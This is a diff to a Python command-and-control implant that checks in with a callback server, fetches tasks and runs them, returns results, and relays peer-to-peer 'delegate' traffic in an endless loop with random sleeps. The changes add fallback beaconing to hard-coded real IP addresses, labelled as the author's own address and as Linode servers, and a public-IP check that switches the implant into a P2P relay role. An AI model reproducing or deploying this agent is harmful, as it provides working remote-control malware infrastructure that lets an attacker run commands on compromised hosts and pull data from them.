@@ -29,8 +29,10 @@ delegates_UUID = []
 delegates_aswers = []
 result = {}
 
-#87.20.204.131
-#194.195.242.157
+# my ip 87.20.204.131
+# linode 194.195.242.157
+# linode 172.104.135.23
+# linode 172.104.135.67
 
 class Agent:
     Server = "callback_host"
@@ -101,8 +103,20 @@ def checkin(agent):
     message = to64(serialized)
     uuid = to64(agent.PayloadUUID)
     
-    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
-
+    x = ""
+    try:
+        x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
+    except:
+        try:
+            print("[P2P server not found. Switching to 194.195.242.157]")
+            agent.Server = "http://194.195.242.157"
+            agent.Port = "9090"
+            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
+        except:
+            print("[P2P server not found. Switching to main server]")
+            agent.Server = "http://87.20.204.131"
+            agent.Port = "80"
+            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
     res = from64(x.text)
 
     agent.UUID = res['id']
@@ -122,6 +136,10 @@ def get_tasks():
     x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
 
     task_list = from64(x.text)
+    
+    if "delegates" in task_list:
+        for m in task_list["delegates"]:
+            delegates_aswers.append(m)
 
     return task_list
 
@@ -145,8 +163,6 @@ def reverse_upload(task_id, file_id):
     x = requests.post(agent.Server + agent.URI, data = uuid + message, headers=agent.UserAgent)
     
     res = from64(x.text)
-    print("\nRESPONSE: " + str(res) + "\n")
-
     res = res['chunk_data']
 
     response_bytes = res.encode('utf-8')
@@ -168,12 +184,15 @@ def post_result():
             'responses': responses,
             'delegates': delegates
         }
-
+        responses = []
+        delegates = []
+        
     else:
         response = {
             'action': "post_response",
             'responses': responses
         }
+        responses = []
 
     serialized = json.dumps(response)
     message = to64(serialized)
@@ -184,16 +203,13 @@ def post_result():
     result = from64(x.text)
 
     if "delegates" in result:
-        delegates_aswers = result["delegates"]
-
-    responses = []
-    delegates = []
+        for m in result["delegates"]:
+            delegates_aswers.append(m)
 
     return result
 
 
 def execute_tasks(tasks):
-
     if tasks:
         for task in tasks['tasks']:
             execute(task)
@@ -283,19 +299,27 @@ agent = Agent()
 uuid_file = "UUID.txt"
 
 if os.path.isfile(uuid_file):
-    f = open(uuid_file, "r")
-    agent.UUID = f.read()
+    # f = open(uuid_file, "r")
+    # agent.UUID = f.read()
+    pass
 
 else:
     checkin(agent)
-    print("\t [CHECKIN] UUID = " + agent.UUID)
-    f = open(uuid_file, "w")
-    f.write(agent.UUID)
-    f.close()
+    print("\t UUID = " + agent.UUID)
+    # f = open(uuid_file, "w")
+    # f.write(agent.UUID)
+    # f.close()
+
+    ip = requests.get('https://api.ipify.org').text
+    print(ip)
+    if ip == "194.195.242.157" or ip == "172.104.135.23" or ip == "172.104.135.67":
+        print("[+] P2P Server")
+        p2p_server(1)
 
 while True:
 
     tasks = get_tasks()
+
     execute_tasks(tasks)
 
     r = random.randint(0,1)
@@ -310,4 +334,5 @@ while True:
 
     # print("[SLEEPING " + str(sleep_time) + "]")
     time.sleep(sleep_time / 5)
+
 
